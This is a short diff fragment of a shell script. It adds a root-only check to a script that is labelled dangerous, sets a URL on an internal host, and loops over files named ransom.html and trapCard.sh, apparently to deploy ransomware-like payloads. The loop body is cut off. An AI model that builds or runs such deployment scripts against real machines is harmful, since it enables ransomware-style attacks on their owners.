@@ -7,6 +7,11 @@
 #THIS SCRIPT IS VERY DANGEROUS. DO NOT RUN
 # ... if you aren't root ;)
 
+if [ `id -u` -ne 0 ]; then
+  echo "Must be root"
+  exit
+fi
+
 url=http://10.0.0.45/ 
 
 for f in ransom.html trapCard.sh; do
